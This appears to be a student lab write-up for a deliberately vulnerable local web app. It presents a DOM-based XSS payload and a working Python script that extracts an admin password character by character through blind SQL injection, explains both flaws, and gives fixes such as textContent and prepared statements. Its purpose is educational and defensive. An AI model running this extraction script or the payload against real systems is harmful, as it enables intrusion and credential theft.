##### implement a web application vulnerable with DOM based XSS and blind SQL injection.  You have to make exploit scripts for them with explanation why your app is vulnerable and why your script is working and how to fix the app.

### Exploitation 
##### XSS Payload :
```html
<img src=x onerror=alert('DOM-XSS')>
```

##### Blind SQL Injection Script :
```python
import requests

def blind_SQLi():
    chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!@#$%^&*()_-+='
    password = ''
    pass_length = 0

    # Getting the password length
    for i in range(1, 51):
        payload = f"cygeek' OR (SELECT LENGTH(password) FROM users WHERE username='admin') = {i} -- -"
        req = requests.get(url=f"http://127.0.0.1:9090/search.php?query={payload}")

        if 'Products found' in req.text:
            pass_length = i
            print(f"Password length: {pass_length}")
            break

    # Iterating through the password char by char
    for i in range(1, pass_length + 1):
        for char in chars:
            payload = f"cygeek' OR (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='admin') = '{char}' -- -"
            req = requests.get(url=f"http://127.0.0.1:9090/search.php?query={payload}")

            if 'Products found' in req.text:
                password += char
                print(f'Current Password: {password}')
                break

    print(f'Final Password: {password}')  # Printing the final password

blind_SQLi()
```

<img width="727" height="781" alt="Pasted image 20251217010424" src="https://github.com/user-attachments/assets/1a53da64-9cc2-417d-9986-4858c38c41ab" />


Now Let's login using the password we've got : `admin / V3ry_D4mn_S3cure_P4ssw0rd!!`

<img width="547" height="152" alt="image" src="https://github.com/user-attachments/assets/dacaa38d-a378-4d4f-a150-842bacce82da" />


---
### Explanation of why the app is vulnerable 
##### XSS
The app uses the `innerHTML` element to print out a greeting message in this code 
```js
document.getElementById("output").innerHTML = "Hello, " + name;
```
`innerHTML` main purpose is adding HTML tags and elements, so the attacker can add other tags such as `<script>` tag to execute malicious JavaScript code, which can allow the attacker to steal users cookies.

##### Blind SQL Injection
The app inject the `$search` variable (`query` param) directly into the SQL statement in this code
```php
$sql = "SELECT * FROM products WHERE name LIKE '%$search%'";
```
Without any security mechanisms, which can allow the attacker to inject a malicious SQL query to steel the users passwords, hashes or any sensitive info from the database

---
### Remediation 
##### XSS
In the `greeting.html` file replace this line of code
```js
document.getElementById("output").innerHTML = "Hello, " + name;
```
To
```js
const escapedName = encodeURIComponent(name);
document.getElementById("output").innerHTML = "Hello, " + escapedName;

// OR

document.getElementById("output").textContent = "Hello, " + name;

// OR 

document.getElementById("output").innerText = "Hello, " + name;
```

- Using `encodeURIComponent()` to escape/encode the URI chars provided by users,
- Using `textContent` OR `innerText` which are safer instead of `innerhtml`

##### Blind SQLi 

In `search.php` file replace this line of code 
```php
$sql = "SELECT * FROM products WHERE name LIKE '%$search%'";
```
To
```php
$stmt = $conn->prepare("SELECT * FROM products WHERE name LIKE ?");
$like = "%$search%";
$stmt->bind_param("s", $like);
$stmt->execute();
```
- **Prepared statements** 
	- SQL structure is sent to MySQL **first** to parse and lock the query logic
- **Parameter binding** 
	- `"s"` means **string**
	- User input is sent **separately from SQL**
	- MySQL treats it as **data only**, never code
